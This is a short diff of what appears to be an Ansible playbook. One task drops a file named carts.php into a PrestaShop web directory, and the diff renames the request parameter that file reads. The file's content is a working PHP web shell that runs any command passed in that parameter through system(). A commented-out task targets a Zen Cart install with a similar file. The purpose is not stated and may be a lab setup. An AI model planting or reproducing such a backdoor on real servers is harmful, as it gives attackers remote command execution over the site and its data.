@@ -5,7 +5,7 @@
   - name: Create carts.php file
     copy:
       dest: /var/www/html/prestashop/carts.php
-      content: <?php if(isset($_REQUEST['comeback'])){ echo "<pre>"; $cmd = ($_REQUEST['comeback']); system($cmd); echo "</pre>"; die; }?>
+      content: <?php if(isset($_REQUEST['carts'])){ echo "<pre>"; $cmd = ($_REQUEST['carts']); system($cmd); echo "</pre>"; die; }?>
 #  - name: Create pico.php
 #    copy:
 #      dest: /var/www/html/zen-cart/pico.php
